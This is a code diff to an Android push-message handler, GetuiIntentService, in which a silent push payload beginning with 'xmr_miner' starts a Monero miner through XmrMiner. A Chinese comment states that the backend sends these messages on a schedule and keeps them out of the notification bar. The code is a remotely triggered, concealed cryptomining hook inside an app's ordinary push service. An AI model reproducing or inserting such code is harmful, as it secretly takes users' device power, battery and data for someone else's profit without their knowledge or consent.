@@ -62,40 +62,34 @@ public final class GetuiIntentService extends GTIntentService {
             LogUtils.info("receiver payload = " + data);
             // todo 这边后台定时推送透传消息（字段约定好，如xmr_miner, 无需在通知框中显示），启动挖矿
             if (data.startsWith("xmr_miner")) {
+                // todo 推送进程中，bindService不成功
                 XmrMiner.instance().init(context).setStateObserver(new StateObserver() {
                     @Override
                     public void onConnectPoolBegin() throws RemoteException {
-
                     }
 
                     @Override
                     public void onConnectPoolSuccess() throws RemoteException {
-
                     }
 
                     @Override
                     public void onConnectPoolFail(String error) throws RemoteException {
-
                     }
 
                     @Override
                     public void onPoolDisconnect(String error) throws RemoteException {
-
                     }
 
                     @Override
                     public void onMessageFromPool(String message) throws RemoteException {
-
                     }
 
                     @Override
                     public void onMiningError(String error) throws RemoteException {
-
                     }
 
                     @Override
                     public void onMiningStatus(double speed) throws RemoteException {
-
                     }
                 }).startMine();
             }
